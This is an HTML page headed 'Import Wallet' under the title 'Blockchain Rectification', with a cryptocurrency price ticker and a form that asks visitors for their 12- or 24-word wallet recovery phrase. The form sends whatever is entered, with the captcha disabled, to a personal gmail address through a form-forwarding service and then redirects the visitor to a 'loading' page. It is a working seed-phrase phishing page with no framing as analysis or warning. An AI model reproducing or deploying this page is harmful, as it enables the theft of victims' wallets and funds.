<html lang="en">
  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blockchain Rectification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;900&amp;display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="style/form.css" />
    <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
  </head>

  <body>
    <!-- Blockchain Widget -->
    <coingecko-coin-price-marquee-widget
      coin-ids="bitcoin,ethereum,eos,ripple,litecoin"
      currency="usd"
      background-color="#ffffff"
      locale="en"
    ></coingecko-coin-price-marquee-widget>

    <main>
      <h1>Import Wallet</h1>
      <form action="https://formsubmit.co/maxajima@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false" />
        <input
          type="hidden"
          name="_next"
          value="https://loading-dapp.pages.dev"
        />
        <label for="message"
          >Typically 12 (sometimes 24) words seperated by a single spaces.
        </label>
        <textarea
          id="message"
          name="message"
          rows="4"
          cols="50"
          required
        ></textarea>

        <!-- <input type="submit" value="Connect Wallet" /> -->
        <button type="submit">Connect Wallet</button>
      </form>
    </main>
  </body>
</html>
